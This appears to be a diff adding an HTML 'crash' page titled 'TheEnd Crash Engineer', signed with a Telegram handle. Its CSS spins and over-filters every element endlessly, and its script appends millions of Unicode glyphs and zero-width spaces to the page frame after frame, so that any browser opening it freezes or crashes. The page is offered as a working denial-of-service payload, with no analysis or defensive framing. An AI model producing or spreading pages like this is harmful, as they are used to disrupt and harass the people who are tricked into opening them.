@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>TheEnd Crash Engineer💮</title>
+  <style>
+    * {
+      animation: boom 0.1s infinite;
+      filter: contrast(9999%) brightness(9999%) saturate(9999%);
+    }
+
+    body {
+      background: black;
+      color: lime;
+      font-family: monospace;
+      font-size: 2em;
+      overflow: hidden;
+    }
+
+    .spam {
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+
+    @keyframes boom {
+      0% { transform: rotate(0deg) scale(1); }
+      50% { transform: rotate(360deg) scale(1.2); }
+      100% { transform: rotate(0deg) scale(1); }
+    }
+  </style>
+</head>
+<body>
+  <h1>Tele : @ZalBaikSekaliii</h1>
+  <div id="crash" class="spam"></div>
+  <iframe srcdoc="<h1>Developer ZalOfficial</h1>".repeat(999) style="display:none"></iframe>
+
+  <script>
+    const char = "𒑡 𝐓𝐡𝐞𝐄𝐧𝐝 ᭧ 𝐄⍜𝐯𝐨𝐥𝐮𝐭𝐢⍜𝐍᭾៚".repeat(5000);
+    const zwsp = "\u200B".repeat(5000);
+    const combo = (char + zwsp).repeat(100);
+
+    let loop = 0;
+    function explode() {
+      document.getElementById("crash").textContent += combo;
+      document.title = "ZalOfficial | TheEnd...🩸";
+      loop++;
+      if (loop < 10000) requestAnimationFrame(explode);
+    }
+
+    explode();
+  </script>
+</body>
+</html>
